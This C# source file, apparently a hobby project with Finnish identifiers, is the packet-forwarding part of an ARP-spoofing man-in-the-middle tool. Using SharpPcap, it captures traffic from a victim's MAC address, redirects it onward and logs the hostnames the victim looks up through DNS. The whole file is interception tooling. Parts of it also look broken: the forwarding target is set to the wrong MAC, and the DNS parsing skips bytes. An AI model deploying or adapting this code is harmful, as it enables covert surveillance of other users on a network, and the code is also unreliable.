using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.WinPcap;
using System.Windows.Forms;

public delegate int lisää_teksti(object teksti);
namespace ARP_spoofer_with_port_forwarding
{
    class port_forwarder
    {
        private PhysicalAddress ohjattava_mac;
        private PhysicalAddress kuunneltava_mac;
        private PhysicalAddress oma_mac;
        
        private IPAddress ohjattava_ip;
        
        private WinPcapDevice kuuntelulaite;


        lisää_teksti add;

        ListBox lb;
        

        public port_forwarder(PhysicalAddress ohjattava_mac,IPAddress ohjattava_ip,PhysicalAddress kuunneltava_mac,WinPcapDevice kuuntelulaite,ListBox lb)
        {


            this.lb = lb;
            add = new lisää_teksti(lb.Items.Add);
            this.kuunneltava_mac = kuunneltava_mac;
            this.ohjattava_ip = ohjattava_ip;
            this.ohjattava_mac = kuunneltava_mac;
          
            this.kuuntelulaite = kuuntelulaite;
            kuuntelulaite.Open(DeviceMode.Normal);
            
            oma_mac = this.kuuntelulaite.MacAddress;
            this.kuuntelulaite.Filter = "(ether src " + kuunneltava_mac + " )";
            //this.kuuntelulaite.Filter = "(ether src "+kuunneltava_mac+" ) && ( ether dst "+oma_mac+" )";
            this.kuuntelulaite.OnPacketArrival += Kuuntelulaite_OnPacketArrival;
            

        }

        public void destruct()
        {

            kuuntelulaite.Close();
            
        }
        public void Capture_stop()
        {

            kuuntelulaite.StopCapture();
              
        }
        public void Capture_start()
        {




            
            
                kuuntelulaite.Capture();

           


        }


        private void Kuuntelulaite_OnPacketArrival(object sender, CaptureEventArgs packet)
        {
            
            var p = packet.Packet.Data;
            EthernetPacket  ep =  (EthernetPacket)EthernetPacket.ParsePacket( packet.Packet.LinkLayerType,p);
            add.Invoke("----------------------------------------------");
            add.Invoke(ep.DestinationHwAddress.ToString());
            ep.DestinationHwAddress = ohjattava_mac;
            kuuntelulaite.SendPacket(ep);
            add.Invoke(ep.DestinationHwAddress.ToString());
            
            
           
            IpPacket ippacket = (IpPacket)ep.PayloadPacket;
            if (ippacket.Protocol == IPProtocolType.UDP)
            {
                UdpPacket udppacket = (UdpPacket)ippacket.PayloadPacket;
                if(udppacket.DestinationPort==53)
                {
                     byte[] data = udppacket.PayloadData;
                    string hostname = "";                  
                     for(int i = 0; i < data.Length; i = i + 3)
                     {
                        try
                        {
                            if (i >= 12 && data.Length - i >= 4)
                            {
                                char b = (char)data[i];
                                hostname += b;
                                if (data.Length - i == 5)
                                {
                                    add.Invoke("Searched for:" + hostname);
                                }

                            }

                        }
                        catch
                        {
                            return;
                        }
                     
                        
                     }

                   



                }                   
                
                   


            }







        }





    }
}
